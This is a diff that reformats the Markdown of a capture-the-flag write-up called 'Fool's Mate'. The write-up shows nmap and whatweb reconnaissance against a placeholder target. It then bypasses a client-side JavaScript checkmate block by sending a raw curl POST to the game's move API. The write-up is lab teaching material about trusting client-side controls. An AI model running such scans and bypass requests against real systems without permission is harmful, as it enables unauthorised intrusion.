@@ -17,11 +17,9 @@ The **Fool's Mate** challenge demonstrates the dangers of relying solely on clie
 ### Port Scanning
 
 We begin by scanning the target host using `nmap` to identify open ports and running services:
-![checkmate](/assets/images/screenshots/shutdown.png)
 
-Bash
 
-```
+```bash
 nmap -Pn -sC -sV -p- <TARGET_IP>
 ```
 
@@ -36,9 +34,8 @@ nmap -Pn -sC -sV -p- <TARGET_IP>
 
 Running `whatweb` against the web service confirms the backend stack:
 
-Bash
 
-```
+```bash
 whatweb http://<TARGET_IP>
 ```
 
@@ -53,11 +50,12 @@ whatweb http://<TARGET_IP>
 
 Upon interacting with the web interface and playing chess moves, attempting a winning move triggers a client-side warning dialog ("_I'll shut down your PC if you play that._") and blocks the action.
 
+![checkmate](/assets/images/screenshots/shutdown.png)
+
 Inspecting the client-side JavaScript source code reveals the following check:
 
-JavaScript
 
-```
+```javascript
 if (probe.isCheckmate()) {
     showSystemNotice("I'll shut down your PC if you play that.");
     return false;
@@ -78,9 +76,7 @@ Since client-side controls can be easily bypassed by crafting raw HTTP requests,
 
 We send a raw `POST` request directly to the move endpoint (`/api/move`) containing the winning move payload:
 
-Bash
-
-```
+```bash
 curl -X POST http://<TARGET_IP>/api/move \
   -H "Content-Type: application/json" \
   -d '{"from":"a1","to":"a8"}'
